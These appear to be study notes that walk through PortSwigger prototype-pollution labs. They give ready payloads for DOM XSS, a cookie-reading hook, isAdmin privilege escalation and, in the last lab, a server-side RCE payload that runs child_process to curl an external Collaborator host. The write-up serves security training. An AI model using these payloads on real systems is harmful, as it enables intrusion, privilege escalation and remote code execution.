## What is an object in JavaScript?
A JavaScript object is essentially just a collection of `key:value` pairs known as "**properties**". For example, the following object could represent a user:

```js
const user = { 
	username: "wiener", 
	userId: 01234, 
	isAdmin: false 
}
```

You can access the properties of an object by using either dot notation or bracket notation to refer to their respective keys:

```js
user.username // "wiener" 
user['userId'] // 01234
```

As well as data, properties may also contain executable functions. In this case, the function is known as a "method".

```js
const user = { 
	username: "wiener", 
	userId: 01234, 
	exampleMethod: function(){ 
	// do something 
	} 
}
```

The example above is an "**object literal**", which means it was created using curly brace syntax to explicitly declare its properties and their initial values
## The Prototype Chain
![[file-20250607201826002.png]]
# Approach
At first glance, a heavy topic in which, as you develop in it, you begin to capture the main essence. It fires very well with the **DOM-Invader extension**.

Arises, usually, in these JS files: `searchLogger.js`, `searchLoggerAlternative.js` and similar `searchLogger`. 

Enable `DOM Invader` in burp browser and enable prototype pollution.
![image](https://user-images.githubusercontent.com/58632878/224733753-a5baf04e-8eb5-4a04-ad2a-ec5835aa2976.png)

![image](https://user-images.githubusercontent.com/58632878/224734034-90a8cde7-18b1-4e81-8ad1-00d9b455c17f.png)  
## Labs
### 1. DOM XSS via client-side prototype pollution
```js
https://site.com/?__proto__[transport_url]=data:,alert(1)
```

### 2. DOM XSS via an alternative prototype pollution vector
Because of a trailing 1 character in the sink eval we add a `-` character due to invalid **JS** syntax.
```js
https://site.com/?__proto__.sequence=alert(1)-
```

### 3. Client-side prototype pollution via flawed sanitization
Scan gadgets and exploit using the source/sink found.
```js
https://site.com/?__pro__proto__to__[transport_url]=data:,alert(1)
```

### 4. Client-side prototype pollution in third-party libraries
```js
https:/site.com/#__proto__[hitCallback]=alert(document.cookie)
```

### 5. Client-side prototype pollution via browser APIs
```js
https://site.com/?__proto__[value]=data:,alert(1);
```

### 6. Privilege escalation via server-side prototype pollution
![[file-20250608181321416.png]]
```js
Billing and Delivery Address:
"__proto__": {
    "isAdmin":true
}
```

### 7. Detecting server-side prototype pollution without polluted property reflection
![[file-20250608183054510.png]]
```js
"__proto__": {
 "status":555
}
```

### 8. Bypassing flawed input filters for server-side prototype pollution
https://portswigger.net/web-security/prototype-pollution/client-side#bypassing-flawed-key-sanitization
Other garbage values are due to the Burp Scans.
![[file-20250608184914104.png]]
```js
 "constructor":{
"prototype":{
"isAdmin":true
}}
```

### 9. Remote code execution via server-side prototype pollution
![[file-20250608191837659.png]]

![[file-20250608192555043.png]]
After sending the above request trigger the  `maintenance job` and you get a hit to your collaborator ID.
![[file-20250608192741728.png]]
Polling on the setup Collaborator.
![[file-20250608192610562.png]]
Similarly, delete the file from the specified the location.
![[file-20250608192538150.png]]
```js
"__proto__":
{"execArgv": [
  "--eval=require('child_process').execSync('curl https://kmazepmj6dq3jzpk2e4ah7fzuq0ho9cy.oastify.com')"
]}
```
